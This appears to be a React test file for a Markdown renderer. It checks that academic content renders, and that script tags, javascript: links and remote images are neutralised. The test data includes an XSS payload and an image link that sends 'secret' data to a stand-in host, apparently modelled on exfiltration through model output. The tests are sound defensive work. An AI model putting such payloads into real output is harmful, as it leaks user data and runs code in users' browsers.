import { render, screen } from "@testing-library/react";
import { describe, it, expect } from "vitest";
import { Markdown } from "./Markdown";
describe("safe academic markdown", () => {
  it("renders tables, code and LaTeX", () => {
    const { container } = render(
      <Markdown
        text={
          "# 课程笔记\n\n$E=mc^2$\n\n| A | B |\n|---|---|\n| 1 | 2 |\n\n```python\nx = 1\n```"
        }
      />,
    );
    expect(
      screen.getByRole("heading", { name: "课程笔记" }),
    ).toBeInTheDocument();
    expect(screen.getByRole("table")).toBeInTheDocument();
    expect(container.querySelector(".katex")).toBeTruthy();
    expect(screen.getByText("x = 1")).toBeInTheDocument();
  });
  it("does not execute embedded HTML or dangerous links", () => {
    const { container } = render(
      <Markdown
        text={"<script>alert(1)</script>\n\n[bad](javascript:alert(1))"}
      />,
    );
    expect(container.querySelector("script")).toBeNull();
    expect(screen.getByText("bad").tagName).toBe("A");
    expect(
      container.querySelector("a")?.getAttribute("href") || "",
    ).not.toContain("javascript:");
  });
});

it("does not fetch remote images embedded in source or model content", () => {
  const { container } = render(
    <Markdown
      text={
        "![private data](https://remote.example/collect?secret=course-text)"
      }
    />,
  );
  expect(container.querySelector("img")).toBeNull();
  expect(screen.getByText(/private data/)).toBeInTheDocument();
});
